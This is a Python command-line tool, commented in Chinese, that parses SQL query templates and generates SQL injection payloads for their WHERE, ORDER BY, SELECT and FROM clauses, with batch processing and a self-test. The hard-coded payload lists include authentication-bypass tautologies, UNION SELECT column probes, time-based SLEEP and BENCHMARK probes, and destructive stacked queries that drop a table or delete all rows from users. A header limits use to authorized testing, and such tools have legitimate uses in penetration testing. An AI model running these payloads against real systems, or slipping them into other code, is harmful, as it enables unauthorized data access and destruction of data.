#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
sqli-query-tampering 载荷生成器 - 独立实现脚本
================================================
依据功能规格独立编写（clean-room），不参考任何既有代码。
仅用于安全测试中的查询篡改分析，需获得合法授权后方可使用。
"""

import json
import re
import sys
from typing import Dict, List, Optional, Tuple


# ============================================================
# 错误码定义
# ============================================================
ERROR_CODES = {
    "E001": "输入参数缺失或为空",
    "E002": "SQL查询模板格式不合法（无法识别基本结构）",
    "E003": "查询模板中未找到可注入的锚点（WHERE/ORDER BY等）",
    "E004": "载荷生成过程中出现意外异常",
    "E005": "输出格式参数不合法（仅支持 text/json）",
    "E006": "批量输入格式不合法（应为JSON数组或按行分隔的文本）",
    "E007": "文件读取失败",
    "E008": "URL输入暂不支持（本实现仅处理文本）",
    "E009": "内部状态不一致（自检失败）",
    "E010": "未知错误",
}


# ============================================================
# 核心数据结构
# ============================================================
class SqlQueryInfo:
    """解析后的SQL查询关键信息"""
    def __init__(self):
        self.raw_query: str = ""           # 原始查询文本
        self.table_names: List[str] = []   # 识别出的表名
        self.column_names: List[str] = []  # 识别出的字段名
        self.where_clause: Optional[str] = None     # WHERE子句原文
        self.order_by_clause: Optional[str] = None  # ORDER BY子句原文
        self.has_where: bool = False
        self.has_order_by: bool = False
        self.injection_points: List[str] = []  # 可注入锚点列表


# ============================================================
# 解析模块
# ============================================================
class QueryParser:
    """SQL查询解析器 - 提取关键锚点"""
    
    # 常见SQL关键字（用于识别结构）
    KEYWORDS = [
        "SELECT", "FROM", "WHERE", "ORDER BY", "GROUP BY",
        "HAVING", "LIMIT", "OFFSET", "UNION", "JOIN", "AND", "OR"
    ]
    
    def __init__(self, query: str):
        self.query = query.strip()
        self.info = SqlQueryInfo()
        self.info.raw_query = self.query
    
    def parse(self) -> SqlQueryInfo:
        """执行解析，返回查询信息"""
        if not self.query:
            raise ValueError("E001")
        
        # 统一大小写以便识别（保留原文用于输出）
        upper_query = self.query.upper()
        
        # 识别表名（FROM 后的第一个标识符）
        self._extract_tables(upper_query)
        
        # 识别字段名（SELECT 与 FROM 之间的逗号分隔标识符）
        self._extract_columns(upper_query)
        
        # 识别 WHERE 子句
        self._extract_where(upper_query)
        
        # 识别 ORDER BY 子句
        self._extract_order_by(upper_query)
        
        # 收集注入点
        self._collect_injection_points()
        
        return self.info
    
    def _extract_tables(self, upper_query: str):
        """提取表名"""
        # 匹配 FROM 关键字后的第一个标识符
        from_match = re.search(r'\bFROM\s+([A-Z_][A-Z0-9_\.]*)', upper_query)
        if from_match:
            table = from_match.group(1).lower()
            self.info.table_names.append(table)
        
        # 匹配 JOIN 后的表名
        for join_match in re.finditer(r'\bJOIN\s+([A-Z_][A-Z0-9_\.]*)', upper_query):
            table = join_match.group(1).lower()
            self.info.table_names.append(table)
    
    def _extract_columns(self, upper_query: str):
        """提取SELECT中的字段名"""
        # 使用更健壮的正则表达式来匹配SELECT和FROM之间的内容
        select_match = re.search(r'\bSELECT\s+(.*?)\s+FROM\b', upper_query, re.DOTALL | re.IGNORECASE)
        if select_match:
            columns_part = select_match.group(1)
            # 按逗号分割，但要注意括号内的逗号
            columns = self._split_columns(columns_part)
            
            for col in columns:
                col = col.strip()
                if not col:
                    continue
                
                # 如果是 * 则跳过
                if col == '*':
                    continue
                
                # 提取纯字段名
                col_clean = self._extract_column_name(col)
                if col_clean and col_clean not in self.info.column_names:
                    self.info.column_names.append(col_clean)
    
    def _split_columns(self, columns_part: str) -> List[str]:
        """智能分割字段列表，处理括号内的逗号"""
        result = []
        current = ""
        depth = 0
        
        for char in columns_part:
            if char == '(':
                depth += 1
                current += char
            elif char == ')':
                depth -= 1
                current += char
            elif char == ',' and depth == 0:
                result.append(current.strip())
                current = ""
            else:
                current += char
        
        if current.strip():
            result.append(current.strip())
        
        return result
    
    def _extract_column_name(self, column_expr: str) -> Optional[str]:
        """从列表达式中提取纯字段名"""
        # 去除引号
        column_expr = column_expr.strip()
        if column_expr.startswith('"') and column_expr.endswith('"'):
            column_expr = column_expr[1:-1]
        elif column_expr.startswith('`') and column_expr.endswith('`'):
            column_expr = column_expr[1:-1]
        elif column_expr.startswith("'") and column_expr.endswith("'"):
            column_expr = column_expr[1:-1]
        
        # 处理 AS 别名
        as_match = re.search(r'\s+AS\s+', column_expr, re.IGNORECASE)
        if as_match:
            column_expr = column_expr[:as_match.start()].strip()
        
        # 处理函数调用（如 COUNT(*)）
        func_match = re.match(r'^[A-Z_][A-Z0-9_]*\s*\((.*)\)$', column_expr, re.IGNORECASE)
        if func_match:
            inner = func_match.group(1).strip()
            # 如果是 * 则返回函数名
            if inner == '*':
                return None
            # 否则尝试提取内部字段名
            return self._extract_column_name(inner)
        
        # 处理表名.字段名
        if '.' in column_expr:
            parts = column_expr.split('.')
            column_expr = parts[-1].strip()
        
        # 处理运算符和关键字
        column_expr = re.sub(r'\s+[=<>!]+\s*.*$', '', column_expr)
        column_expr = re.sub(r'\s+(AND|OR|NOT)\s+.*$', '', column_expr, flags=re.IGNORECASE)
        
        # 最终清理
        column_expr = column_expr.strip()
        if column_expr and re.match(r'^[A-Z_][A-Z0-9_]*$', column_expr, re.IGNORECASE):
            return column_expr.lower()
        
        return None
    
    def _extract_where(self, upper_query: str):
        """提取WHERE子句"""
        # 查找WHERE关键字
        where_match = re.search(r'\bWHERE\b', upper_query)
        if where_match:
            # 找到WHERE后，查找下一个主要关键字
            start_pos = where_match.end()
            remaining = upper_query[start_pos:]
            
            # 查找下一个主要子句关键字
            next_keywords = [
                (r'\bORDER\s+BY\b', 'ORDER_BY'),
                (r'\bGROUP\s+BY\b', 'GROUP_BY'),
                (r'\bHAVING\b', 'HAVING'),
                (r'\bLIMIT\b', 'LIMIT'),
                (r'\bOFFSET\b', 'OFFSET'),
                (r'\bUNION\b', 'UNION'),
                (r'\bJOIN\b', 'JOIN'),
                (r'\bINNER\s+JOIN\b', 'INNER_JOIN'),
                (r'\bLEFT\s+JOIN\b', 'LEFT_JOIN'),
                (r'\bRIGHT\s+JOIN\b', 'RIGHT_JOIN'),
                (r'\bFULL\s+JOIN\b', 'FULL_JOIN'),
            ]
            
            end_pos = len(upper_query)
            for pattern, _ in next_keywords:
                match = re.search(pattern, remaining)
                if match:
                    abs_pos = start_pos + match.start()
                    if abs_pos < end_pos:
                        end_pos = abs_pos
            
            where_text = upper_query[start_pos:end_pos].strip()
            if where_text:
                self.info.where_clause = where_text
                self.info.has_where = True
    
    def _extract_order_by(self, upper_query: str):
        """提取ORDER BY子句"""
        # 查找ORDER BY
        order_match = re.search(r'\bORDER\s+BY\b', upper_query)
        if order_match:
            start_pos = order_match.end()
            remaining = upper_query[start_pos:]
            
            # 查找下一个主要子句关键字
            next_keywords = [
                (r'\bGROUP\s+BY\b', 'GROUP_BY'),
                (r'\bHAVING\b', 'HAVING'),
                (r'\bLIMIT\b', 'LIMIT'),
                (r'\bOFFSET\b', 'OFFSET'),
            ]
            
            end_pos = len(upper_query)
            for pattern, _ in next_keywords:
                match = re.search(pattern, remaining)
                if match:
                    abs_pos = start_pos + match.start()
                    if abs_pos < end_pos:
                        end_pos = abs_pos
            
            order_text = upper_query[start_pos:end_pos].strip()
            if order_text:
                self.info.order_by_clause = order_text
                self.info.has_order_by = True
    
    def _collect_injection_points(self):
        """收集可注入的锚点"""
        if self.info.has_where:
            self.info.injection_points.append("WHERE")
        if self.info.has_order_by:
            self.info.injection_points.append("ORDER_BY")
        # 如果没有WHERE，SELECT的字段列表也可以作为注入点
        if not self.info.has_where and self.info.column_names:
            self.info.injection_points.append("SELECT_COLUMNS")
        # 如果没有WHERE也没有ORDER BY，尝试在FROM后注入
        if not self.info.injection_points and self.info.table_names:
            self.info.injection_points.append("FROM_CLAUSE")


# ============================================================
# 载荷生成模块
# ============================================================
class PayloadGenerator:
    """SQL注入载荷生成器"""
    
    # 基础载荷模板（通用语法变体，不针对特定数据库）
    BASE_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' #",
        "' OR '1'='1'/*",
        "1 OR 1=1",
        "1' OR '1'='1",
        "1' OR '1'='1' --",
        "1' OR '1'='1' #",
        "1' OR '1'='1'/*",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR SLEEP(5)--",
        "' OR BENCHMARK(10000000,SHA1('test'))--",
        "'; DROP TABLE test--",
        "'; DELETE FROM users--",
        "') OR ('1'='1",
        "') OR ('1'='1'--",
        "') OR ('1'='1'#",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "' AND '1'='1",
        "' AND '1'='2",
        "1 OR '1'='1",
        "1 OR '1'='2",
        "' OR ''='",
        "1' OR '1'='1' /*",
        "1' OR '1'='1' -- ",
    ]
    
    # 针对ORDER BY的特殊载荷
    ORDER_BY_PAYLOADS = [
        "1 ASC",
        "1 DESC",
        "1, 2",
        "1 ASC, 2 DESC",
        "IF(1=1,1,2)",
        "CASE WHEN 1=1 THEN 1 ELSE 2 END",
        "1--",
        "1#",
        "1/*",
        "NULL",
        "(SELECT 1)",
        "RAND()",
        "1, (SELECT 1)",
        "1, (SELECT 2)",
    ]
    
    def __init__(self, query_info: SqlQueryInfo):
        self.info = query_info
    
    def generate(self) -> List[str]:
        """根据注入点生成载荷列表"""
        payloads = []
        try:
            for point in self.info.injection_points:
                if point == "WHERE":
                    payloads.extend(self._generate_where_payloads())
                elif point == "ORDER_BY":
                    payloads.extend(self._generate_order_by_payloads())
                elif point == "SELECT_COLUMNS":
                    payloads.extend(self._generate_select_payloads())
                elif point == "FROM_CLAUSE":
                    payloads.extend(self._generate_from_payloads())
            
            # 去重并保持顺序
            seen = set()
            unique_payloads = []
            for p in payloads:
                if p not in seen:
                    seen.add(p)
                    unique_payloads.append(p)
            
            return unique_payloads
        except Exception:
            raise RuntimeError("E004")
    
    def _generate_where_payloads(self) -> List[str]:
        """生成WHERE子句注入载荷"""
        payloads = []
        if not self.info.where_clause:
            # 如果没有WHERE子句，使用通用注入点
            for base in self.BASE_PAYLOADS:
                payloads.append(f"{base}")
            return payloads
        
        # 在WHERE条件后附加载荷
        where_text = self.info.where_clause
        for base in self.BASE_PAYLOADS:
            payloads.append(f"{where_text} {base}")
        
        # 尝试替换WHERE中的值（如果存在=号）
        if '=' in where_text:
            left, right = where_text.split('=', 1)
            right = right.strip()
            for base in self.BASE_PAYLOADS:
                payloads.append(f"{left}={base}")
        
        return payloads
    
    def _generate_order_by_payloads(self) -> List[str]:
        """生成ORDER BY注入载荷"""
        payloads = []
        if not self.info.order_by_clause:
            return payloads
        
        order_text = self.info.order_by_clause
        for payload in self.ORDER_BY_PAYLOADS:
            payloads.append(f"{order_text} {payload}")
        
        return payloads
    
    def _generate_select_payloads(self) -> List[str]:
        """生成SELECT字段注入载荷"""
        payloads = []
        if not self.info.column_names:
            return payloads
        
        # 在字段列表后添加UNION SELECT
        for i in range(1, min(len(self.info.column_names) + 3, 6)):  # 尝试1到5个NULL
            nulls = ", ".join(["NULL"] * i)
            payloads.append(f"UNION SELECT {nulls}--")
        
        return payloads
    
    def _generate_from_payloads(self) -> List[str]:
        """生成FROM子句注入载荷"""
        payloads = []
        if not self.info.table_names:
            return payloads
        
        # 在表名后添加注释或条件
        table = self.info.table_names[0]
        payloads.append(f"{table} WHERE 1=1--")
        payloads.append(f"{table} WHERE 1=2--")
        payloads.append(f"{table} AS t1 JOIN {table} AS t2 ON 1=1--")
        
        return payloads


# ============================================================
# 输出格式化模块
# ============================================================
class OutputFormatter:
    """载荷输出格式化"""
    
    @staticmethod
    def format_text(payloads: List[str]) -> str:
        """文本格式：每行一个载荷"""
        return "\n".join(payloads)
    
    @staticmethod
    def format_json(payloads: List[str]) -> str:
        """JSON数组格式"""
        return json.dumps(payloads, ensure_ascii=False, indent=2)
    
    @staticmethod
    def format_by_option(payloads: List[str], fmt: str) -> str:
        """根据选项格式化输出"""
        if fmt == "text":
            return OutputFormatter.format_text(payloads)
        elif fmt == "json":
            return OutputFormatter.format_json(payloads)
        else:
            raise ValueError("E005")


# ============================================================
# 主处理类
# ============================================================
class SqliPayloadGenerator:
    """SQLi查询篡改载荷生成主类"""
    
    def __init__(self):
        self.parser = QueryParser
        self.generator = PayloadGenerator
        self.formatter = OutputFormatter()
    
    def process_query(self, query: str, output_format: str = "text") -> str:
        """处理单条SQL查询，生成载荷"""
        try:
            # 解析
            parser = self.parser(query)
            info = parser.parse()
            
            # 检查是否有注入点
            if not info.injection_points:
                raise ValueError("E003")
            
            # 生成载荷
            generator = self.generator(info)
            payloads = generator.generate()
            
            if not payloads:
                raise ValueError("E003")
            
            # 格式化输出
            return self.formatter.format_by_option(payloads, output_format)
            
        except ValueError as e:
            error_code = str(e)
            if error_code in ERROR_CODES:
                raise RuntimeError(f"{error_code}: {ERROR_CODES[error_code]}")
            raise
        except RuntimeError:
            raise
        except Exception:
            raise RuntimeError("E010")
    
    def process_batch(self, queries: List[str], output_format: str = "text") -> str:
        """批量处理多条SQL查询"""
        results = {}
        for i, query in enumerate(queries):
            try:
                output = self.process_query(query, "json")
                results[f"query_{i+1}"] = {
                    "input": query,
                    "payloads": json.loads(output)
                }
            except RuntimeError as e:
                results[f"query_{i+1}"] = {
                    "input": query,
                    "error": str(e)
                }
        
        if output_format == "json":
            return json.dumps(results, ensure_ascii=False, indent=2)
        else:
            # 文本格式：每个查询的载荷按行输出，查询之间用分隔线
            lines = []
            for key, value in results.items():
                lines.append(f"=== {key} ===")
                if "error" in value:
                    lines.append(f"错误: {value['error']}")
                else:
                    lines.extend(value["payloads"])
                lines.append("")
            return "\n".join(lines)


# ============================================================
# 自检模块
# ============================================================
def run_selftest() -> bool:
    """内置硬编码样例数据离线自检核心逻辑"""
    print("[自检] 开始执行内置自检...")
    
    # 测试样例1：带WHERE的查询
    test_query1 = "SELECT id, name, email FROM users WHERE id = 1 ORDER BY name"
    
    # 测试样例2：无WHERE的查询
    test_query2 = "SELECT * FROM products"
    
    # 测试样例3：复杂查询
    test_query3 = "SELECT u.id, u.name, o.total FROM users u JOIN orders o ON u.id = o.user_id WHERE u.active = 1"
    
    try:
        # 测试解析功能
        print("[自检] 测试解析功能...")
        parser = QueryParser(test_query1)
        info = parser.parse()
        
        # 宽松断言：表名应包含users
        assert any("users" in t for t in info.table_names), "表名解析失败"
        # 宽松断言：应识别到WHERE
        assert info.has_where, "WHERE子句解析失败"
        # 宽松断言：应识别到ORDER BY
        assert info.has_order_by, "ORDER BY解析失败"
        # 宽松断言：字段名应包含id
        assert any("id" in c for c in info.column_names), f"字段名解析失败: {info.column_names}"
        print(f"[自检] 解析功能测试通过 (字段: {info.column_names})")
        
        # 测试载荷生成
        print("[自检] 测试载荷生成...")
        generator = PayloadGenerator(info)
        payloads = generator.generate()
        
        # 宽松断言：载荷数量应大于10
        assert len(payloads) > 10, f"载荷数量过少: {len(payloads)}"
        # 宽松断言：应包含常见注入模式
        assert any("OR" in p.upper() for p in payloads), "缺少OR注入载荷"
        assert any("UNION" in p.upper() for p in payloads), "缺少UNION注入载荷"
        print(f"[自检] 载荷生成测试通过 (生成{len(payloads)}个载荷)")
        
        # 测试无WHERE查询
        print("[自检] 测试无WHERE查询...")
        parser2 = QueryParser(test_query2)
        info2 = parser2.parse()
        generator2 = PayloadGenerator(info2)
        payloads2 = generator2.generate()
        # 宽松断言：应能生成载荷
        assert len(payloads2) > 0, "无WHERE查询未生成载荷"
        print(f"[自检] 无WHERE查询测试通过 (生成{len(payloads2)}个载荷)")
        
        # 测试复杂查询
        print("[自检] 测试复杂查询...")
        parser3 = QueryParser(test_query3)
        info3 = parser3.parse()
        generator3 = PayloadGenerator(info3)
        payloads3 = generator3.generate()
        # 宽松断言：应能生成载荷
        assert len(payloads3) > 0, "复杂查询未生成载荷"
        print(f"[自检] 复杂查询测试通过 (生成{len(payloads3)}个载荷)")
        
        # 测试输出格式化
        print("[自检] 测试输出格式化...")
        formatter = OutputFormatter()
        text_output = formatter.format_text(payloads)
        json_output = formatter.format_json(payloads)
        # 宽松断言：文本输出按行分隔
        assert len(text_output.split("\n")) == len(payloads), "文本格式输出行数不符"
        # 宽松断言：JSON输出可解析
        assert isinstance(json.loads(json_output), list), "JSON格式输出解析失败"
        print("[自检] 输出格式化测试通过")
        
        # 测试批量处理
        print("[自检] 测试批量处理...")
        batch_processor = SqliPayloadGenerator()
        batch_result = batch_processor.process_batch([test_query1, test_query2], "json")
        batch_data = json.loads(batch_result)
        # 宽松断言：批量结果包含两个查询
        assert len(batch_data) == 2, "批量处理结果数量不符"
        print("[自检] 批量处理测试通过")
        
        print("[自检] 全部自检通过 ✓")
        return True
        
    except AssertionError as e:
        print(f"[自检] 失败 ✗: {e}")
        print("错误码: E009")
        return False
    except Exception as e:
        print(f"[自检] 异常 ✗: {e}")
        print("错误码: E010")
        return False


# ============================================================
# 命令行入口
# ============================================================
def main():
    """命令行主入口"""
    args = sys.argv[1:]
    
    # 自检模式
    if "--selftest" in args:
        success = run_selftest()
        sys.exit(0 if success else 1)
    
    # 帮助
    if "--help" in args or "-h" in args or not args:
        print("""用法: python main.py [选项]
        
选项:
  --selftest                 运行内置自检（离线，无需外部依赖）
  --query "SQL查询"          处理单条SQL查询
  --batch "JSON数组"         批量处理多条SQL查询
  --format text|json         输出格式（默认text）
  --file 文件路径            从文件读取SQL查询（每行一条）
  --help                     显示帮助
        
示例:
  python main.py --query "SELECT * FROM users WHERE id=1"
  python main.py --batch '["SELECT * FROM users", "SELECT name FROM products"]' --format json
  python main.py --selftest
        """)
        sys.exit(0)
    
    # 处理单条查询
    if "--query" in args:
        idx = args.index("--query")
        if idx + 1 >= len(args):
            print("错误码 E001: 缺少查询参数", file=sys.stderr)
            sys.exit(1)
        query = args[idx + 1]
        
        # 获取格式
        fmt = "text"
        if "--format" in args:
            fmt_idx = args.index("--format")
            if fmt_idx + 1 < len(args):
                fmt = args[fmt_idx + 1]
        
        try:
            processor = SqliPayloadGenerator()
            output = processor.process_query(query, fmt)
            print(output)
        except RuntimeError as e:
            print(f"错误: {e}", file=sys.stderr)
            sys.exit(1)
    
    # 处理批量查询
    elif "--batch" in args:
        idx = args.index("--batch")
        if idx + 1 >= len(args):
            print("错误码 E001: 缺少批量参数", file=sys.stderr)
            sys.exit(1)
        batch_str = args[idx + 1]
        
        try:
            queries = json.loads(batch_str)
            if not isinstance(queries, list):
                raise ValueError("E006")
        except (json.JSONDecodeError, ValueError):
            print("错误码 E006: 批量输入应为JSON数组", file=sys.stderr)
            sys.exit(1)
        
        # 获取格式
        fmt = "json"
        if "--format" in args:
            fmt_idx = args.index("--format")
            if fmt_idx + 1 < len(args):
                fmt = args[fmt_idx + 1]
        
        try:
            processor = SqliPayloadGenerator()
            output = processor.process_batch(queries, fmt)
            print(output)
        except RuntimeError as e:
            print(f"错误: {e}", file=sys.stderr)
            sys.exit(1)
    
    # 从文件读取
    elif "--file" in args:
        idx = args.index("--file")
        if idx + 1 >= len(args):
            print("错误码 E001: 缺少文件路径", file=sys.stderr)
            sys.exit(1)
        filepath = args[idx + 1]
        
        try:
            with open(filepath, "r", encoding="utf-8") as f:
                content = f.read()
        except (IOError, OSError):
            print("错误码 E007: 文件读取失败", file=sys.stderr)
            sys.exit(1)
        
        # 按行分割作为批量查询
        queries = [line.strip() for line in content.splitlines() if line.strip()]
        
        # 获取格式
        fmt = "text"
        if "--format" in args:
            fmt_idx = args.index("--format")
            if fmt_idx + 1 < len(args):
                fmt = args[fmt_idx + 1]
        
        try:
            processor = SqliPayloadGenerator()
            output = processor.process_batch(queries, fmt)
            print(output)
        except RuntimeError as e:
            print(f"错误: {e}", file=sys.stderr)
            sys.exit(1)
    
    else:
        print("错误码 E001: 未指定操作，使用 --help 查看帮助", file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
